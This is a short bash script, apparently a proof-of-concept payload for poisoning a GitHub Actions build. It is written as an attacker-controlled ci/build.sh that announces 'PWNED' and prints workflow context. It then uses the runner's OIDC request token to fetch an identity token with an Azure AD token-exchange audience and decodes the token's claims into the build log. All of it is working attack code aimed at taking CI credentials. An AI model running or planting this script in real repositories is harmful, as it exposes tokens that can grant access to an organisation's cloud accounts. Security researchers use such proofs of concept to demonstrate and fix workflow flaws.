#!/usr/bin/env bash
set -x
echo "PWNED: attacker-controlled ci/build.sh executed"
echo "EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF SHA=$GITHUB_SHA ACTOR=$GITHUB_ACTOR"
echo "OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes} OIDC_TOK_SET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
echo "OIDC_TOKEN_LEN=${#TOK}"
if [ -n "$TOK" ]; then echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo; fi
